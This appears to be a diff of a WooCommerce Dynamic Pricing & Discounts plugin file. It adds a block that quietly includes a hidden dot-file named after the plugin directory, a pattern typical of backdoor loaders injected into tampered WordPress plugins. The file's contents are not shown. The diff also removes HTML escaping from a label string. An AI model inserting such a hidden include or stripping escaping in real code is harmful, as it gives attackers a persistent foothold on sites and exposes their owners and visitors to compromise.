@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Pricing_Method_Fixed')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Pricing_Method_Fixed_Price_Per_Product extends RP_WCDPD_Pricing_Method_Fixed
 {
 
@@ -49,7 +53,7 @@ class RP_WCDPD_Pricing_Method_Fixed_Price_Per_Product extends RP_WCDPD_Pricing_M
      */
     public function get_label()
     {
-        return esc_html__('Fixed price per item', 'rp_wcdpd');
+        return __('Fixed price per item', 'rp_wcdpd');
     }
 
     /**
